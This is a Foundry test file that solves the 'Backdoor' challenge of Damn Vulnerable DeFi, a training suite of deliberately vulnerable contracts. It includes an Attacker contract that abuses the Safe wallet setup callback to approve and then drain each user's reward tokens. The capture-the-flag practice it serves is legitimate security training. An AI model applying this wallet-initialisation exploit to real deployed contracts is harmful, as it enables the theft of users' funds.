// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory, IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import { SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    /*
    1. Create a new wallet 
    2. Use the setUp modules on setup function to call approve on token to then take them 

    1. Create a new wallet 
    2. Use the setUp modules on setup function to setup a module that allows me to use token funds, and then modify to owner of proxy (me out beneficiary in)
    
    1. Create a new wallet 
    2. Use the setupModules on setup function to call a multicall contract that delegate calls to WalletRegistry with "this" as proxy address and returning a beneficiary when request for them
    I was wrong, I dont neet to call the setup modules, just pass the call to the  registry callback as initializer 
    
    1. prev proxy address -> Now I can use the initializer cause I dont need proxy address to create it, so I can call the proxy -> needs to add the wallet registry as owner 
     */
    function test_backdoor() public 
    checkSolvedByPlayer 
    {
        Attacker attacker = new Attacker();

        attacker.attack(
            users,
            token,
            walletFactory,
            singletonCopy,
            walletRegistry,
            recovery
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}


contract Attacker {
    function approve(DamnValuableToken token, address receiver, uint256 amount) public {
        token.approve(receiver, amount);
    }
    
    function attack(
        address[] memory users,
        DamnValuableToken token,
        SafeProxyFactory walletFactory,
        Safe singletonCopy,
        WalletRegistry walletRegistry,
        address recovery
    ) public {
        // loop for each user
        for(uint8 i; i<users.length; i++) {
            // prepare setup params
            address[] memory _owners = new address[](1);
            _owners[0] = users[i];

            bytes memory initializer = abi.encodeWithSignature(
                'setup(address[],uint256,address,bytes,address,address,uint256,address)',
                _owners, 
                1, 
                // THE ATTACK IS HERE (next 2 lines)
                address(this), // call this contract
                abi.encodeWithSignature('approve(address,address,uint256)', token, address(this), 10e18), // ATTACK -> call to approve tokens on behalf the Safe
                address(0), 
                address(0),
                0,
                address(0) 
            );

            // create the wallet
            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                0,
                walletRegistry
            );
            // Aboves function finish when the callback to Registry is executed AKA the new wallet already has the reward
            // So we just have to call transferFrom to recover the funds
            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }
}